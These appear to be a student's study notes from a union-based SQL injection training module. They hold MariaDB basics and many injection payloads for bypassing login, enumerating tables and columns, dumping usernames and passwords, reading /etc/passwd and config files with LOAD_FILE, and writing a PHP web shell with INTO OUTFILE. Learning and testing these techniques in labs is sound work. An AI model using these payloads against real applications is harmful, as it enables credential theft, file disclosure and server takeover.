# SQL injection

\*In here in these module is there only union bases SQL injection \*

\*\*SQL commands used in these module

```
admin' or '1'='1

1'='1' OR id=5  )#

1'='1' OR id=5  )-- -

' UNION SELECT 4,user(),4,4-- -


cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -


cn' UNION select 1, username, password, 5 from ilfreight.users-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4--

cn' UNION SELECT 1, 2, 'PHP web shell code', 4 INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```

\*\*SQL payloads used in the skill assessment

```
1'='1' OR admin
u=-1') UNION SELECT 'MARKER1','MARKER2','MARKER3','MARKER4'-- -
') ORDER BY 1 -- -
') ORDER BY 2 -- -
') ORDER BY 3 -- -
') ORDER BY 4 -- - 
u=-1') UNION SELECT 1,2,database(),4-- -
u=-1') UNION SELECT 1,2,group_concat(table_name),4 FROM information_schema.tables WHERE table_schema=database()-- -
u=-1') UNION SELECT 1,2,group_concat(column_name),4 FROM information_schema.columns WHERE table_name='Users'-- -
u=-1') UNION SELECT 1,2,group_concat(Username,':',Password),4 FROM Users-- -
u=-1') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
u=-1') UNION SELECT 1, 2, variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
after these i used to create a file to make the reverse shell by using the php 
u=-1') UNION SELECT 1, 2, 'PHP web shell code', 4 INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```

**SQL basics**

\*here is there some of basics sql

```

┌──(umedh㉿kali)-[~]
└─$ mysql -u root -h 154.57.164.70 -P 31238 -p --skip-ssl
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 4
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]> SHOW DATABASES
    ->
    ->
    -> ;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.225 sec)
MariaDB [(none)]> USE my_new_db;
Database changed
MariaDB [my_new_db]> SHOW TABLES;
Empty set (0.207 sec)

MariaDB [my_new_db]> CREATE TABLE db (
    -> id INT,
    -> namebd VARCHAR(16),
    -> date_of_creation DATETIME
    -> );
Query OK, 0 rows affected (0.256 sec)

MariaDB [my_new_db]> SHOW TABLES;
+---------------------+
| Tables_in_my_new_db |
+---------------------+
| db                  |
+---------------------+
MariaDB [my_new_db]> ALTER TABLE db  MODIFY id INT NOT NULL AUTO_INCREMENT PRIMARY KEY;
Query OK, 0 rows affected (0.267 sec)
Records: 0  Duplicates: 0  Warnings: 0

MariaDB [my_new_db]> DESCRIBE db;
+------------------+-------------+------+-----+---------+----------------+
| Field            | Type        | Null | Key | Default | Extra          |
+------------------+-------------+------+-----+---------+----------------+
| id               | int(11)     | NO   | PRI | NULL    | auto_increment |
| namebd           | varchar(16) | YES  |     | NULL    |                |
| date_of_creation | datetime    | YES  |     | NULL    |                |
+------------------+-------------+------+-----+---------+----------------+
3 rows in set (0.232 sec)
MariaDB [my_new_db]> DROP TABLE IF EXISTS db;
Query OK, 0 rows affected (0.272 sec)
MariaDB [employees]> INSERT INTO employees VALUES (4, '2006-07-20', 'umedh', 'polepalli', 'M', '2026-10-01');
Query OK, 1 row affected (0.206 sec)

MariaDB [employees]> INSERT INTO salaries VALUES (4, 444444444, '2026-10-01', '2028-04-04');
Query OK, 1 row affected (0.233 sec)

MariaDB [employees]> SELECT * FROM salaries;
+--------+-----------+------------+------------+
| emp_no | salary    | from_date  | to_date    |
+--------+-----------+------------+------------+
|      4 | 444444444 | 2026-10-01 | 2028-04-04 |
+--------+-----------+------------+------------+
1 row in set (0.496 sec)
MariaDB [employees]> ALTER TABLE employees ADD date_of_join DATETIME;
Query OK, 0 rows affected (0.465 sec)
Records: 0  Duplicates: 0  Warnings: 0
 UPDATE employees
    -> SET date_of_join = '2026-03-29'
    -> WHERE date_of_join IS NULL OR date_of_join = '0000-00-00';
Query OK, 655 rows affected (0.212 sec)
Rows matched: 655  Changed: 655  Warnings: 0
MariaDB [employees]> SELECT * FROM employees WHERE first_name LIKE 'Bar%';
+--------+------------+------------+-----------+--------+------------+---------------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  | date_of_join        |
+--------+------------+------------+-----------+--------+------------+---------------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 | 2026-03-29 00:00:00 |
|  10395 | 1960-02-23 | Bartek     | Nastansky | F      | 1989-06-05 | 2026-03-29 00:00:00 |
|  10601 | 1956-08-10 | Barton     | Soicher   | F      | 1986-02-21 | 2026-03-29 00:00:00 |
+--------+------------+------------+-----------+--------+------------+---------------------+
MariaDB [employees]> SELECT * FROM employees LIMIT 1
    -> ;
+--------+------------+------------+-----------+--------+------------+---------------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  | date_of_join        |
+--------+------------+------------+-----------+--------+------------+---------------------+
|      4 | 2006-07-20 | umedh      | polepalli | M      | 2026-10-01 | 2026-03-29 00:00:00 |
+--------+------------+------------+-----------+--------+------------+---------------------+
1 row in set (0.244 sec)

MariaDB [employees]> SELECT * FROM employees LIMIT 1,4;
+--------+------------+------------+-------------+--------+------------+---------------------+
| emp_no | birth_date | first_name | last_name   | gender | hire_date  | date_of_join        |
+--------+------------+------------+-------------+--------+------------+---------------------+
|  10001 | 1953-09-02 | Georgi     | Facello     | M      | 1986-06-26 | 2026-03-29 00:00:00 |
|  10002 | 1952-12-03 | Vivian     | Billawala   | F      | 1986-12-11 | 2026-03-29 00:00:00 |
|  10003 | 1959-06-16 | Temple     | Lukaszewicz | M      | 1992-07-04 | 2026-03-29 00:00:00 |
|  10004 | 1956-11-06 | Masanao    | Rahimi      | M      | 1986-12-16 | 2026-03-29 00:00:00 |
+--------+------------+------------+-------------+--------+------------+---------------------+
4 rows in set (1.213 sec)

MariaDB [employees]> SELECT * FROM employees LIMIT 0,4;
+--------+------------+------------+-------------+--------+------------+---------------------+
| emp_no | birth_date | first_name | last_name   | gender | hire_date  | date_of_join        |
+--------+------------+------------+-------------+--------+------------+---------------------+
|      4 | 2006-07-20 | umedh      | polepalli   | M      | 2026-10-01 | 2026-03-29 00:00:00 |
|  10001 | 1953-09-02 | Georgi     | Facello     | M      | 1986-06-26 | 2026-03-29 00:00:00 |
|  10002 | 1952-12-03 | Vivian     | Billawala   | F      | 1986-12-11 | 2026-03-29 00:00:00 |
|  10003 | 1959-06-16 | Temple     | Lukaszewicz | M      | 1992-07-04 | 2026-03-29 00:00:00 |
SELECT * FROM employees ORDER BY hire_date DESC
    -> ;
+--------+------------+--------------+-----------------+--------+------------+---------------------+
| emp_no | birth_date | first_name   | last_name       | gender | hire_date  | date_of_join        |
+--------+------------+--------------+-----------------+--------+------------+---------------------+
|      4 | 2006-07-20 | umedh        | polepalli       | M      | 2026-10-01 | 2026-03-29 00:00:00 |
|  10543 | 1959-05-30 | Hilari       | Smeets          | M      | 1999-06-27 | 2026-03-29 00:00:00 |
|  10474 | 1962-06-07 | Xiaocheng    | Wiegley         | F      | 1999-05-10 | 2026-03-29 00:00:00 |
|  10251 | 1956-07-05 | Tzvetan      | Iwayama         | M      | 1999-04-01 | 2026-03-29 00:00:00 |
|  10468 | 1963-03-02 | Branimir     | Cronin          | M      | 1999-02-14 | 2026-03-29 00:00:00 |
|  10500 | 1956-04-20 | Ute          | Detkin          | M      | 1998-12-03 | 2026-03-29 00:00:00 |

MariaDB [employees]> SELECT * FROM employees ORDER BY hire_date ASC;
+--------+------------+--------------+-----------------+--------+------------+---------------------+
| emp_no | birth_date | first_name   | last_name       | gender | hire_date  | date_of_join        |
+--------+------------+--------------+-----------------+--------+------------+---------------------+
|  10099 | 1961-07-27 | Ayakannu     | Mitina          | F      | 1985-02-02 | 2026-03-29 00:00:00 |
|  10537 | 1958-08-11 | Maren        | Baez            | M      | 1985-02-05 | 2026-03-29 00:00:00 |
|  10278 | 1955-03-03 | Jackson      | Merlo           | M      | 1985-02-10 | 2026-03-29 00:00:00 |
|  10310 | 1960-11-12 | Ulf          | Barbanera       | M      | 1985-02-16 | 2026-03-29 00:00:00 |
|  10358 | 1961-03-27 | Hauke        | Ventosa         | F      | 1985-02-17 | 2026-03-29 00:00:00 |
|  10093 | 1953-02-06 | Mizuhito     | Litvinov        | F      | 1985-02-17 | 2026-03-29 00:00:00 |
|  10492 | 1963-03-01 | Yunming      | Ranum           | F      | 1985-02-19 | 2026-03-29 00:00:00 |
|  10608 | 1960-09-04 | Leszek       | Pulkowski       | M      | 1985-02-23 | 2026-03-29 00:00:00 |
|  10541 | 1961-07-03 | Urs          | Herber          | F      | 1985-02-25 | 2026-03-29 00:00:00 |
|  10390 | 1961-07-10 | Hairong      | Denis           | F      | 1985-03-11 | 2026-03-29 00:00:00 |
MariaDB [employees]> ALTER TABLE employees DROP COLUMN date_of_join;
Query OK, 0 rows affected (0.220 sec)
Records: 0  Duplicates: 0  Warnings: 0

MariaDB [employees]> SELECT * FROM employees LIMIT 4
    -> ;
+--------+------------+------------+-------------+--------+------------+
| emp_no | birth_date | first_name | last_name   | gender | hire_date  |
+--------+------------+------------+-------------+--------+------------+
|      4 | 2006-07-20 | umedh      | polepalli   | M      | 2026-10-01 |
|  10001 | 1953-09-02 | Georgi     | Facello     | M      | 1986-06-26 |
|  10002 | 1952-12-03 | Vivian     | Billawala   | F      | 1986-12-11 |
|  10003 | 1959-06-16 | Temple     | Lukaszewicz | M      | 1992-07-04 |
+--------+------------+------------+-------------+--------+------------+
MariaDB [employees]> SELECT * FROM employees WHERE first_name ='umedh' AND emp_no=4;
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|      4 | 2006-07-20 | umedh      | polepalli | M      | 2026-10-01 |
+--------+------------+------------+-----------+--------+------------+

```

**Comments** \*Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/` (although this is not typically used in basic sql injections). The `--` can be used as follows:

in SQL when ever we are using comments like these `--comment` we got error because we need to add the space after the adding the -- like these `-- comment` in here after -- is there the space

```
SELECT username FROM logins; -- Selects usernames from the logins table

SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

\*\*UNION CLASS

The Union clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases.

```
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

```

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns. For example, if we attempt to `UNION` two queries that have results with a different number of columns, we get the following error:

```
MariaDB [employees]> SELECT * FROM employees UNION SELECT * FROM current_dept_emp  LIMIT 2 ;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

```
MariaDB [employees]> SELECT * FROM employees UNION SELECT *,1,1 FROM current_dept_emp  LIMIT 2 ;
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10001 | 1953-09-02 | Georgi     | Facello   | M      | 1986-06-26 |
|  10002 | 1952-12-03 | Vivian     | Billawala | F      | 1986-12-11 |
+--------+------------+------------+-----------+--------+------------+
```

_For remove these error we need to add the equal number of columns like these_

So, to reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:

So, to reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:

```
`SELECT * FROM my_database.users;`
```

\*\*TABLES

Before we dump data from the `dev` database, we need to get a list of the tables to query them with a `SELECT` statement. To find all tables within a database, we can use the `TABLES` table in the `INFORMATION_SCHEMA` Database.

The [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the `TABLE_SCHEMA` and `TABLE_NAME` columns. The `TABLE_NAME` column stores table names, while the `TABLE_SCHEMA` column points to the database each table belongs to. This can be done similarly to how we found the database names. For example, we can use the following payload to find the tables within the `dev` database:

```

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
```

\*\*Columns

To dump the data of the `credentials` table, we first need to find the column names in the table, which can be found in the `COLUMNS` table in the `INFORMATION_SCHEMA` database. The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns can be used to achieve this. As we did before, let us try this payload to find the column names in the `credentials` table:

```

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
```

***

\*\*Data

Now that we have all the information, we can form our `UNION` query to dump data of the `username` and `password` columns from the `credentials` table in the `dev` database. We can place `username` and `password` in place of columns 2 and 3:

```

cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

\*\*DB User

First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:

```
SELECT USER() 
SELECT CURRENT_USER() 
SELECT user from mysql.user
```

\*\*Reading file

In SQL we need to read file we need to use these function LOAD\_FILE("file-name")

```
SELECT LOAD_FILE('/etc/passwd');
```

## SQL Injection

SQL injection means we are adding SQL code in input of a application to steel data from the databases

### \*\*SQL Injection Detection

| **Test Type**       | **Common Payload** | **What to Observe**                                                        |
| ------------------- | ------------------ | -------------------------------------------------------------------------- |
| **Error-Based**     | `'` or `"`         | Look for SQL syntax errors or a "500 Internal Server Error" page.          |
| **Boolean (True)**  | `' OR 1=1--`       | The page loads normally or displays extra data (like all users).           |
| **Boolean (False)** | `' OR 1=2--`       | The page shows an "Invalid" message, disappears, or changes content.       |
| **Time-Based**      | `SLEEP(10)`        | The browser "hangs" and the page takes exactly 10 seconds to load.         |
| **Arithmetic**      | `10-5`             | If inputting `10-5` returns the same result as `5`, the math was executed. |

### Types of SQL injection

In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as `In-band` SQL injection, and it has two types: `Union Based` and `Error Based`.

With `Union Based` SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. As for `Error Based` SQL injection, it is used when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.

In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as `Blind` SQL injection, and it also has two types: `Boolean Based` and `Time Based`.

With `Boolean Based` SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns `true`. As for `Time Based` SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.

Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as `Out-of-band` SQL injection.

\*\*Important points

`In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol. Because # is used as a tag in browser`

**Union injection**

\*\*Detect number of columns

Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:

* Using `ORDER BY`
* Using `UNION`

**Using order by** For example, we can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

```
' order by 1-- -
' order by 2-- -
' order by 3-- -
' order by 4-- -
```

when ever we enter the `' order by 1-- -` we don't get any error means in here is there at least one column until we can when ever we got error means that column does not exist in here is here the 4 columns when ever we try for the 5 column we got the error means in here is there the 4 column only

\*\*Using UNION

The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column `UNION` query:

```
cn' UNION select 1,2,3,4-- -
```

Location of Injection

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:



```
' UNION select 1,@@version,3,4-- -
```

in here we are trying the column 2 is display means in the column it show the version



**Database Enumeration**

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

\*\*Accessing file

_When ever we are trying to access a file (read or write) each and every user does not have the permission to access the file first we need to check we have the access or not_

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

```
SELECT super_priv FROM mysql.user
```

when ever we inject these payload these will return Y(yes) or N(no) means if it returns Y means your a root. When your a root you can have the power to access the file both read and write

```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -


```

these payload is basically in the form of union class .

| \*\*Component                             | \*\*Role   | \*\*What it tells the Database                                                                                 |
| ----------------------------------------- | ---------- | -------------------------------------------------------------------------------------------------------------- |
| cn'                                       | Breakout   | "End the original username string right here."                                                                 |
| UNION SELECT                              | Joiner     | "Run my second query and append the results to the first."                                                     |
| 1, ..., 4                                 | Balancer   | "Match the original 4 columns so the query doesn't crash."                                                     |
| grantee                                   | Target 1   | "Show me the name of the user who holds the permission."                                                       |
| privilege\_type                           | Target 2   | "Tell me exactly what they can do (e.g., SELECT, DELETE, FILE)."                                               |
| information\_schema.user\_privileges      | The Source | "Look in the master list of Global (Server-wide) permissions."                                                 |
| WHERE grantee="'root'@'localhost'"        | The Filter | "Only show me the powers held by the 'root' administrator."                                                    |
| -- -                                      | Comment    | "Ignore all the code written by the original developer."                                                       |
| variable\_name, variable\_value\`         |            | Asks for the name of the setting and what it is currently set to.                                              |
| where variable\_name="secure\_file\_priv" |            | Filters specifically for the most important security variable regarding file access.(for the writing the file) |

\*\*Reading file

```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

\*\*Writing file

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

using the `SELECT .. INTO OUTFILE` statement. The `INTO OUTFILE` statement can be used to write data from select queries into files. This is usually used for exporting data from tables

```
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

u=-1') UNION SELECT 1, 2, variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
```

To check the file permission we can use these payload

```
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
Umedh@htb[/htb]$ cat /tmp/test.txt 
this is a test
```

Writing file with union class

```
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```



_If we have the permission to write we can write the web shell and connect through it_
